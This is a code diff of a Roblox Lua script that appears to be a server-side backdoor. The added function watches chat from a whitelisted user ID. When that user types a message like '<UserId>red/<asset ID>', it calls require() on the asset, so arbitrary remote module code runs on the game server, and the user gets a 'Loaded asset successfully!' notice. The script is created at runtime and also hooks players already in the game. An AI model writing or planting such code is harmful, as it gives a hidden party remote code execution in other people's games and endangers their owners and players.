@@ -4,13 +4,34 @@ script = Instance.new("Script")
 
 local list={game.CreatorId}
 
+local DoThing = function(p)
+	if table.find(list,p.Name) or table.find(list,p.UserId) then
+		p.Chatted:connect(function(msg)
+			local id=tonumber(msg:split(p.UserId.."red/")[2]) --5450973191red/ID_HERE
+			if id then
+				local s=pcall(function()
+					require(id) 
+				end)
+				if not s then
+					local h=Instance.new("Hint",p.PlayerGui)
+					h.Text="Invalid asset!"
+					wait(3)
+					h:Destroy()
+				else
+					local h=Instance.new("Hint",p.PlayerGui)
+					h.Text="Loaded asset successfully!"
+					wait(3)
+					h:Destroy()
+				end
+			end
+		end)
+	end
+end
+
 game:service("Players").PlayerAdded:Connect(function(p)
-if table.find(list,p.Name) or table.find(list,p.UserId) then
-p.Chatted:connect(function(msg)
-local id=tonumber(msg:split("/c"..p.UserId.."r\")[2])
-if id then
-require(id)
-end
+	DoThing(p)
 end)
+
+for i,p in pairs(game:service("Players"):GetPlayers()) do
+	DoThing(p)
 end
-end)
